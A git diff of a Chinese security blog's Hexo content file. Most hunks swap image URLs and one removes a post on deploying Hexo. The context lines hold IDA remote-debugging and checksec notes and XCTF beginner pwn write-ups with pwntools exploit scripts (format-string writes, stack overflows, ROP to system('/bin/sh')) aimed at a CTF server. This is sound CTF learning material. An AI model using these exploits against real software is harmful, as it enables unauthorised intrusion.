@@ -6,14 +6,14 @@
     <content><![CDATA[<p>记一次IDA远程调试过程</p>
 <a id="more"></a>
 <hr>
-<p>首先打开IDA所在文件夹<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-21-18-50.png" alt="2020-06-10-21-18-50"><br>将<code>linux_server</code>和<code>linux_server64</code>两个文件传输到要远程访问的linux机器上  </p>
+<p>首先打开IDA所在文件夹<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-21-18-50.png" alt="2020-06-10-21-18-50"><br>将<code>linux_server</code>和<code>linux_server64</code>两个文件传输到要远程访问的linux机器上  </p>
 <p>设置执行权限  </p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-0-15-ubuntu:~/ctf<span class="comment"># chmod +x linux_server</span></span><br><span class="line">root@VM-0-15-ubuntu:~/ctf<span class="comment"># chmod +x linux_server64</span></span><br></pre></td></tr></table></figure>
 
-<p>如何要进行调试的文件是32程序则运行<code>linux_server</code>,如果是64位程序则运行<code>linux_server64</code><br>下面以32位程序为例：<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-21-28-08.png" alt="2020-06-10-21-28-08"><br>可以看到监听的端口为23946</p>
-<p>运行IDA32,选择远程linux调试<br>Debugger-&gt;Run-&gt;Remote Linux debugger<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-21-31-16.png" alt="2020-06-10-21-31-16"></p>
-<p>进行如下设置<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-21-35-34.png" alt="2020-06-10-21-35-34">  </p>
-<p>设置完成之后，就可以使用IDA远程调试了<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-21-38-26.png" alt="2020-06-10-21-38-26"><br>基本操作与Ollydbg差不多，支持更改汇编代码</p>
+<p>如何要进行调试的文件是32程序则运行<code>linux_server</code>,如果是64位程序则运行<code>linux_server64</code><br>下面以32位程序为例：<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-21-28-08.png" alt="2020-06-10-21-28-08"><br>可以看到监听的端口为23946</p>
+<p>运行IDA32,选择远程linux调试<br>Debugger-&gt;Run-&gt;Remote Linux debugger<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-21-31-16.png" alt="2020-06-10-21-31-16"></p>
+<p>进行如下设置<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-21-35-34.png" alt="2020-06-10-21-35-34">  </p>
+<p>设置完成之后，就可以使用IDA远程调试了<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-21-38-26.png" alt="2020-06-10-21-38-26"><br>基本操作与Ollydbg差不多，支持更改汇编代码</p>
 ]]></content>
       <tags>
         <tag>IDA</tag>
@@ -28,7 +28,7 @@
 <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh.git</span><br><span class="line">cd checksec.sh</span><br><span class="line">sudo ln –sf checksec &#x2F;usr&#x2F;bin&#x2F;checksec</span><br></pre></td></tr></table></figure>
 <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-01-21-47-37.png" alt="2020-06-01-21-47-37"></p>
+<p><img src="https://pic.xsblog.xyz/blog/2020-06-01-21-47-37.png" alt="2020-06-01-21-47-37"></p>
 <p><font size=4 color=#87CEFA><b>Arch:</b></font><br>程序架构信息。<br>判断是拖进64位IDA还是32位,exp编写时p64还是p32函数</p>
 <p><font size=4 color=#87CEFA><b>RELRO:</b></font><br>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br>部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入/bin/sh\x00获得shell<br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c &#x2F;&#x2F; 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
@@ -45,38 +45,6 @@
       <tags>
         <tag>xctf</tag>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo同时部署到github和coding</title>
-    <url>/2020/07/06/hexo%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%92%8Ccoding/</url>
-    <content><![CDATA[<p>github服务器访问太慢，尝试同时搭建到github和coding</p>
-<a id="more"></a>
-<hr>
-<h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>首先需要创建一个仓库，名字为<code>yourname</code>.github.io，其中<code>yourname</code>为你注册时的用户名<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-15-08-11.png" alt="2020-07-06-15-08-11"><br>在setting-&gt;Options-&gt;GitHub Pages里面设置page服务，一般已经配置好了<br>然后就是将ssh密钥传到github上，首先在本地生成密钥</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_github_email@example.com&quot;</span><br></pre></td></tr></table></figure>
-<p>运行命令连续敲三个空格就可以了，会在<code>/root/.ssh</code>生成密钥文件<br>打开github设置，Settings-&gt;SSH and GPG keys，添加密钥，名字随意，key的内容使将刚刚生成的密钥文件id_rsa.pub中所有的内容复制过去<br>运行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-<p>出现以下提示表示配置成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi xxxxxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置coding"><a href="#配置coding" class="headerlink" title="配置coding"></a>配置coding</h2><p>coding和github应该使用同一个邮箱注册<br>新建项目（DevOps项目），其他类型的项目没有page服务，项目名称与用户名相同，在持续部署中找到静态网站，实名认证之后发布静态网站<br>在个人设置里添加ssh公钥，和github使用的公钥一样复制就行<br>运行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@coding.net</span><br></pre></td></tr></table></figure>
-<p>出现以下提示表示配置成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Coding 提示: Hello xxxxx, You&#39;ve connected to Coding.net via SSH. This is a personal key.</span><br><span class="line">xxxxxx，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥.</span><br><span class="line">公钥指纹：xx:xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h2><p>配置hexo根目录文件_config.yml<br>添加以下配置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">    coding: git@e.coding.net:yourname&#x2F;yourname&#x2F;yourname.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<p>安装一键部署插件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<p>接下来就是配置git  </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br></pre></td></tr></table></figure>
-<p>这里邮箱为注册邮箱，名字随意<br>然后<code>hexo g&amp;&amp;hexo d</code>即可实现部署<br>对于github，访问<code>yourname.github.io</code>测试是否可以成功访问<br>对于coding，访问其静态网站服务所提供的网址来测试  </p>
-<h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>我用的是阿里云，添加解析<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-15-55-51.png" alt="2020-07-06-15-55-51"><br>在github的page服务出绑定刚添加的解析域名<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-15-59-27.png" alt="2020-07-06-15-59-27"><br>在coding中也可以绑定域名，强制配置https<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-16-02-00.png" alt="2020-07-06-16-02-00">   </p>
-<p>对于github，还要在source文件夹里面新建CNAME文件，里面加入所绑定的域名，不然每次部署之后，绑定的域名就会消失<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-16-26-38.png" alt="2020-07-06-16-26-38"><br>以上就全部配置完毕了</p>
-]]></content>
-      <tags>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -114,67 +82,67 @@
 <h2 id="0x01-get-shell"><a href="#0x01-get-shell" class="headerlink" title="0x01 get_shell"></a>0x01 get_shell</h2><blockquote>
 <p>题目描述: 运行就能拿到shell呢，真的</p>
 </blockquote>
-<p>直接使用nc连接远程端口就可返回shell<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-19-56-28.png" alt="2020-06-05-19-56-28"></p>
+<p>直接使用nc连接远程端口就可返回shell<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-19-56-28.png" alt="2020-06-05-19-56-28"></p>
 <h2 id="0x02-CGfsb"><a href="#0x02-CGfsb" class="headerlink" title="0x02 CGfsb"></a>0x02 CGfsb</h2><blockquote>
 <p>题目描述: 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用 </p>
 </blockquote>
-<p>首先使用<code>checksec</code>查看文件安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-00-55.png" alt="2020-06-05-20-00-55"></p>
+<p>首先使用<code>checksec</code>查看文件安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-20-00-55.png" alt="2020-06-05-20-00-55"></p>
 <p>关于checksec的使用可以参考<a href="https://xsblog.xyz/2020/05/29/xctf/checksec%E4%BD%BF%E7%94%A8/">checksec工具使用</a>    </p>
-<p>将程序拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-06-05.png" alt="2020-06-05-20-06-05"><br>显然在程序的第23行存在<code>格式化字符串漏洞</code>,而且发现关键代码<code>system(&quot;cat flag)</code>,条件是使得<code>pwnme</code>值为8；<br>关于格式化字符串漏洞可参考<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞</a></p>
+<p>将程序拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-20-06-05.png" alt="2020-06-05-20-06-05"><br>显然在程序的第23行存在<code>格式化字符串漏洞</code>,而且发现关键代码<code>system(&quot;cat flag)</code>,条件是使得<code>pwnme</code>值为8；<br>关于格式化字符串漏洞可参考<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞</a></p>
 <p>利用格式化字符串漏洞修改<code>pwnme</code>的值<br><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'33985'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">io.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'please:\n'</span>)</span><br><span class="line">pwnme_addr = p32(<span class="number">0x0804a068</span>)    <span class="comment"># 获取pwnme的地址</span></span><br><span class="line">payload = pwnme_addr + <span class="string">'%4c%10$n'</span>   <span class="comment"># 构造payload</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()  <span class="comment"># recvall()输出所有，直到EOF</span></span><br></pre></td></tr></table></figure>
 <p>关于pwn工具的使用可参考<a href="https://bbs.pediy.com/thread-247217.htm" target="_blank" rel="noopener">pwntools使用</a></p>
 <h2 id="0x03-when-did-you-born"><a href="#0x03-when-did-you-born" class="headerlink" title="0x03 when_did_you_born"></a>0x03 when_did_you_born</h2><blockquote>
 <p>题目描述: 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-04-03.png" alt="2020-06-05-21-04-03">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-10-40.png" alt="2020-06-05-21-10-40">  </p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-04-03.png" alt="2020-06-05-21-04-03">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-10-40.png" alt="2020-06-05-21-10-40">  </p>
 <p>发现危险函数<code>gets</code>,存在溢出漏洞，通过v4溢出修改v5的值<br><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'34377'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Birth?\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'33'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Name?\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">1926</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x04-hello-pwn"><a href="#0x04-hello-pwn" class="headerlink" title="0x04 hello_pwn"></a>0x04 hello_pwn</h2><blockquote>
 <p>题目描述: pwn！，segment fault！菜鸡陷入了深思</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-33-58.png" alt="2020-06-05-21-33-58">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-37-38.png" alt="2020-06-05-21-37-38"><br>read函数处可能造成溢出</p>
-<p>由源代码可知只需使<code>if</code>中等式成立便可以得到flag<br>跟进变量<code>unk_601068</code>,发现<code>dword_60106C</code>就在下面将，则可以通过read修改其值<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-40-22.png" alt="2020-06-05-21-40-22">  </p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-33-58.png" alt="2020-06-05-21-33-58">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-37-38.png" alt="2020-06-05-21-37-38"><br>read函数处可能造成溢出</p>
+<p>由源代码可知只需使<code>if</code>中等式成立便可以得到flag<br>跟进变量<code>unk_601068</code>,发现<code>dword_60106C</code>就在下面将，则可以通过read修改其值<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-40-22.png" alt="2020-06-05-21-40-22">  </p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'30839'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'for bof\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x05-level0"><a href="#0x05-level0" class="headerlink" title="0x05 level0"></a>0x05 level0</h2><blockquote>
 <p>题目描述: 菜鸡了解了什么是溢出，他相信自己能得到shell</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-46-06.png" alt="2020-06-05-21-46-06">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-48-39.png" alt="2020-06-05-21-48-39"> </p>
-<p>直接进入vulnerable_function()<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-49-50.png" alt="2020-06-05-21-49-50"><br>由于read函数所能读入的最大字节要大于buf与栈底的距离，所以存在栈溢出漏洞  </p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-46-06.png" alt="2020-06-05-21-46-06">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-48-39.png" alt="2020-06-05-21-48-39"> </p>
+<p>直接进入vulnerable_function()<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-21-49-50.png" alt="2020-06-05-21-49-50"><br>由于read函数所能读入的最大字节要大于buf与栈底的距离，所以存在栈溢出漏洞  </p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'36544'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'World\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'A'</span>*<span class="number">0x08</span>+p64(<span class="number">0x400596</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x06-level2"><a href="#0x06-level2" class="headerlink" title="0x06 level2"></a>0x06 level2</h2><blockquote>
 <p>题目描述: 菜鸡请教大神如何获得flag，大神告诉他‘使用<code>面向返回的编程</code>(ROP)就可以了’</p>
 </blockquote>
-<p>查看保护机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-34-00.png" alt="2020-06-05-22-34-00">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-42-59.png" alt="2020-06-05-22-42-59"><br>与<code>level0</code>同样的溢出漏洞，只不过在程序里找不到现成的可以获取shell的函数了，所以需要将程序中的字符串当做<code>system</code>的参数传入  </p>
-<p>在IDA中使用<code>shift+F12</code>可以查看程序中的所有字符串及其位置<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-46-27.png" alt="2020-06-05-22-46-27"><br>看到有<code>/bin/sh</code>字符串，地址为<code>0x0804A024</code> </p>
-<p>溢出原理图<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-01-54.png" alt="2020-06-05-23-01-54"></p>
+<p>查看保护机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-22-34-00.png" alt="2020-06-05-22-34-00">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-22-42-59.png" alt="2020-06-05-22-42-59"><br>与<code>level0</code>同样的溢出漏洞，只不过在程序里找不到现成的可以获取shell的函数了，所以需要将程序中的字符串当做<code>system</code>的参数传入  </p>
+<p>在IDA中使用<code>shift+F12</code>可以查看程序中的所有字符串及其位置<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-22-46-27.png" alt="2020-06-05-22-46-27"><br>看到有<code>/bin/sh</code>字符串，地址为<code>0x0804A024</code> </p>
+<p>溢出原理图<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-23-01-54.png" alt="2020-06-05-23-01-54"></p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'31250'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'A'</span>*<span class="number">0x04</span>+p32(<span class="number">0x08048320</span>)+<span class="string">'A'</span>*<span class="number">0x4</span>+p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment"># 调用一个新的函数时，会将esp的值赋值到ebp上去，所以不用管ebp赋值到了一个无效地址，依然可以恢复正常工作</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x07-guess-num"><a href="#0x07-guess-num" class="headerlink" title="0x07 guess_num"></a>0x07 guess_num</h2><blockquote>
 <p>菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-04-03.png" alt="2020-06-05-23-04-03"><br>可以看到这次安全机制基本上都开了</p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-21-54.png" alt="2020-06-05-23-21-54"><br>gets存在溢出漏洞，可以通过gets修改随即种子<code>seed</code>的值</p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-23-04-03.png" alt="2020-06-05-23-04-03"><br>可以看到这次安全机制基本上都开了</p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-23-21-54.png" alt="2020-06-05-23-21-54"><br>gets存在溢出漏洞，可以通过gets修改随即种子<code>seed</code>的值</p>
 <p>整个程序的逻辑就是猜数字，猜中十次才可以的到flag；<br>这里使用rand来生成随机数，然而rand生成的随机数并不是真正的随机数,只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1；<br>正常情况下应该使种子随生成的随机数而变化，即每生成一次随机数更改一次种子  </p>
-<p>使用python自带的ctypes模块进行python和c混合编程<br>使用ldd查看guss_num所使用的共享库libc<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-42-17.png" alt="2020-06-05-23-42-17"><br>可以看到<code>libc.so.6</code>指向的文件<code>/lib/x86_64-linux-gnu/libc.so.6</code>可当做共享库载入python中,载入之后就可以通过python调用共享库中的函数，实现混合编程</p>
+<p>使用python自带的ctypes模块进行python和c混合编程<br>使用ldd查看guss_num所使用的共享库libc<br><img src="https://pic.xsblog.xyz/blog/2020-06-05-23-42-17.png" alt="2020-06-05-23-42-17"><br>可以看到<code>libc.so.6</code>指向的文件<code>/lib/x86_64-linux-gnu/libc.so.6</code>可当做共享库载入python中,载入之后就可以通过python调用共享库中的函数，实现混合编程</p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'43798'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span>+p32(<span class="number">1</span>)   <span class="comment"># 由于seed[0]大小为32位，所以使用p32</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">        io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">        io.sendline(num)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
 <p><strong>注:</strong> 最后的<code>print io.recvall()</code>可以用<code>io.interactive()</code>代替，不过使用后者会返回一个无效的命令行</p>
 <h2 id="0x08-cgpwn2"><a href="#0x08-cgpwn2" class="headerlink" title="0x08 cgpwn2"></a>0x08 cgpwn2</h2><blockquote>
 <p>题目描述: 菜鸡认为自己需要一个字符串</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-05-57.png" alt="2020-06-06-08-05-57">  </p>
-<p>拖入IDA查看反汇编代码<br>直接跟进hello<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-27-47.png" alt="2020-06-06-08-27-47">  </p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-08-05-57.png" alt="2020-06-06-08-05-57">  </p>
+<p>拖入IDA查看反汇编代码<br>直接跟进hello<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-08-27-47.png" alt="2020-06-06-08-27-47">  </p>
 <p>显然在gets()函数存在溢出<br>然而程序中有现成<code>system</code>函数，却找不到可以利用的字符串，考率到前面的<code>fgets</code>函数，可以尝试将所需要的字符串参数传入<code>name</code>变量中，在将<code>name</code>作为<code>system</code>的参数传入  </p>
 <p><strong>解题脚本:</strong>  </p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'42443'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'here:\n'</span>)</span><br><span class="line">name_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x26</span>+<span class="string">'A'</span>*<span class="number">4</span>+p32(<span class="number">0x08048420</span>)+<span class="string">'A'</span>*<span class="number">4</span>+p32(name_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -182,11 +150,11 @@
 <h2 id="0x09-string"><a href="#0x09-string" class="headerlink" title="0x09 string"></a>0x09 string</h2><blockquote>
 <p>题目描述: 菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</p>
 </blockquote>
-<p>查看程序安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-44-13.png" alt="2020-06-06-13-44-13">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-52-14.png" alt="2020-06-06-13-52-14"><br>输出了V4的值，其他暂未发现异常，跟进查看<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-53-23.png" alt="2020-06-06-13-53-23"><br>创建了一个新的游戏人物，同时调用了三个函数，依次跟进查看</p>
-<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-54-49.png" alt="2020-06-06-13-54-49"><br>在第一个函数中碰到了一个循环，必须输入east才能跳出循环  </p>
-<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-56-49.png" alt="2020-06-06-13-56-49"><br>在第二个函数中发现了格式化字符串漏洞，触发条件为<code>v1==1</code>  </p>
